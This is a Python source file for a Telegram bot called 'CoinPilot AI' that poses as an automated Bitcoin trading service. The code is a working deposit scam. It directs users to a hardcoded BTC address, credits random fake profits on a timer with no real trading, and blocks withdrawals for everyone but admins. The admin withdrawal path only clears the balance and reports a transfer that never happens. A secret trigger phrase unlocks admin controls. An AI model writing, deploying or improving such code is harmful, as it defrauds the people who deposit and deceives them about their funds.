import os
import random
import requests
import asyncio
import json
import nest_asyncio
from aiohttp import web

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

nest_asyncio.apply()

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable is not set")

SECRET_INJECT_TRIGGER = "NewMexicoMouse"
DATA_FILE = "data.json"

def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except:
        return {"admins": [6064485557], "users": {}}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f)

data = load_data()

# User Data Access

def get_user_data(uid):
    return data["users"].setdefault(str(uid), {"balance": 0.0, "state": {"running": False, "strategy": None}})

def get_balance(uid):
    return get_user_data(uid).get("balance", 0.0)

def set_balance(uid, amount):
    get_user_data(uid)["balance"] = amount
    save_data(data)

def get_state(uid):
    return get_user_data(uid)["state"]

def set_state(uid, state):
    get_user_data(uid)["state"] = state
    save_data(data)

def is_admin(uid):
    return uid in data.get("admins", [])

def add_admin(uid):
    if uid not in data["admins"]:
        data["admins"].append(uid)
        save_data(data)

def remove_admin(uid):
    if uid in data["admins"]:
        data["admins"].remove(uid)
        save_data(data)

# Menus

def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("\ud83d\udcb0 Balance", callback_data='balance')],
        [
            InlineKeyboardButton("\ud83d\u4ec4 Withdrawal", callback_data='withdrawal'),
            InlineKeyboardButton("\ud83d\udce5 Deposit", callback_data='deposit')
        ],
        [
            InlineKeyboardButton("\u25b6\ufe0f Run", callback_data='run'),
            InlineKeyboardButton("\u23f9 Stop", callback_data='stop')
        ],
        [
            InlineKeyboardButton("\ud83d\udcca Monitor", callback_data='monitor'),
            InlineKeyboardButton("\ud83e\udde0 Strategy", callback_data='strategy')
        ],
        [InlineKeyboardButton("\ud83d\udeaa Exit", callback_data='exit')]
    ])

def get_strategy_menu():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("\ud83d\udcc8 Momentum", callback_data='strategy_momentum'),
            InlineKeyboardButton("\ud83d\udcc9 Mean Reversion", callback_data='strategy_mean'),
            InlineKeyboardButton("\u2699\ufe0f Grid", callback_data='strategy_grid')
        ],
        [InlineKeyboardButton("\ud83d\udd19 Back", callback_data='back_to_main')]
    ])

pending_withdrawal = {}
pending_inject = {}
admin_panel_state = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    get_user_data(uid)
    try:
        with open("header.jpg", "rb") as img:
            await update.message.reply_photo(photo=InputFile(img), caption="Welcome to CoinPilot AI!")
    except:
        await update.message.reply_text("Welcome to CoinPilot AI!")
    await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    action = query.data
    bal = get_balance(uid)
    state = get_state(uid)

    if action == "exit":
        await query.edit_message_text("\ud83d\udeaa Session ended. Goodbye!")
        return
    elif action == "deposit":
        await query.edit_message_text("\ud83d\udcbc This is your deposit address (Minimum 0.001 BTC):", reply_markup=get_main_menu())
        await query.message.reply_text("`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`", parse_mode="Markdown")
    elif action == "balance":
        await query.edit_message_text(f"\ud83d\udcb0 Balance: {bal:.8f} BTC", reply_markup=get_main_menu())
    elif action == "withdrawal":
        if bal <= 0:
            await query.edit_message_text("\u274c You can't withdraw with 0 BTC.", reply_markup=get_main_menu())
        elif not is_admin(uid):
            await query.edit_message_text("\u274c Transaction failed. You are not authorized.", reply_markup=get_main_menu())
        else:
            pending_withdrawal[uid] = {'step': 1}
            await query.edit_message_text("\ud83d\udcb8 Enter BTC address:")
            await context.bot.send_message(data['admins'][0], f"\u26a0\ufe0f User {uid} started a withdrawal with {bal:.8f} BTC")
    elif action == "run":
        if bal <= 0:
            await query.edit_message_text("\u26a0\ufe0f No balance. Deposit first.", reply_markup=get_main_menu())
        else:
            state["running"] = True
            set_state(uid, state)
            await query.edit_message_text("\u2705 Bot started.", reply_markup=get_main_menu())
    elif action == "stop":
        state["running"] = False
        set_state(uid, state)
        await query.edit_message_text("\u23f9 Bot stopped.", reply_markup=get_main_menu())
    elif action == "monitor":
        try:
            price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()["bitcoin"]["usd"]
        except:
            price = "Unknown"
        msg = f"\ud83d\udcca *Monitor*\n----------------------\n\ud83e\udde0 Strategy: {state['strategy']}\n\u2696 Status: {'Running' if state['running'] else 'Stopped'}\n\ud83d\udcb0 Balance: {bal:.8f} BTC\n\ud83d\udcc8 BTC Price: ${price}\n\ud83d\udcc8 Profit: $0.00"
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=get_main_menu())
    elif action == "strategy":
        await query.edit_message_text("\ud83d\udca1 Choose a strategy:", reply_markup=get_strategy_menu())
    elif action.startswith("strategy_"):
        strat = action.split("_")[1]
        state["strategy"] = strat.title()
        set_state(uid, state)
        await query.edit_message_text(f"\ud83d\udca1 Strategy set: {strat.title()}", reply_markup=get_strategy_menu())
    elif action == "back_to_main":
        await query.edit_message_text("Choose an option:", reply_markup=get_main_menu())
    elif action == "withdraw_confirm":
        if not is_admin(uid):
            await query.edit_message_text("\u274c Withdrawal failed. Unauthorized.")
            return
        wd = pending_withdrawal.get(uid)
        if not wd or wd.get('step') != 2:
            await query.answer("No pending withdrawal.", show_alert=True)
            return
        fee = bal * 0.05
        net = bal - fee
        set_balance(uid, 0.0)
        pending_withdrawal.pop(uid, None)
        await query.edit_message_text(f"\u2705 Sent {net:.8f} BTC to `{wd['address']}`\nFee: {fee:.8f} BTC", parse_mode="Markdown", reply_markup=get_main_menu())
    elif action == "withdraw_cancel":
        pending_withdrawal.pop(uid, None)
        await query.edit_message_text("\u274c Withdrawal cancelled.", reply_markup=get_main_menu())

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message.text.strip()

    if msg == SECRET_INJECT_TRIGGER:
        if is_admin(uid):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("\u2795 Add Admin", callback_data="add_admin")],
                [InlineKeyboardButton("\u2796 Remove Admin", callback_data="remove_admin")],
                [InlineKeyboardButton("\ud83d\udcc3 View Admins", callback_data="view_admins")]
            ])
            await update.message.reply_text("\ud83d\udd27 Admin Controls:", reply_markup=keyboard)
        else:
            await update.message.reply_text("\u274c Access Denied.")
        return

    if uid in pending_withdrawal and pending_withdrawal[uid].get("step") == 1:
        pending_withdrawal[uid] = {"step": 2, "address": msg}
        fee = get_balance(uid) * 0.05
        net = get_balance(uid) - fee
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("\u2705 Confirm", callback_data="withdraw_confirm"),
             InlineKeyboardButton("\u274c Cancel", callback_data="withdraw_cancel")]
        ])
        await update.message.reply_text(f"\u26a0\ufe0f Confirm Withdrawal\nTo: `{msg}`\nNet: {net:.8f} BTC\nFee: {fee:.8f} BTC", parse_mode="Markdown", reply_markup=keyboard)

async def profit_loop(context: ContextTypes.DEFAULT_TYPE):
    for uid in data['users']:
        uid_int = int(uid)
        state = get_state(uid_int)
        if state.get("running"):
            profit = random.uniform(0.00001, 0.00005)
            set_balance(uid_int, get_balance(uid_int) + profit)

async def web_handle(request):
    return web.Response(text="OK")

async def run_web():
    app = web.Application()
    app.router.add_get("/", web_handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", int(os.getenv("PORT", 8000)))
    await site.start()
    while True:
        await asyncio.sleep(3600)

async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.job_queue.run_repeating(profit_loop, interval=5, first=5)
    web_task = asyncio.create_task(run_web())
    await app.run_polling()
    web_task.cancel()
    try:
        await web_task
    except asyncio.CancelledError:
        pass

if __name__ == "__main__":
    asyncio.run(main())
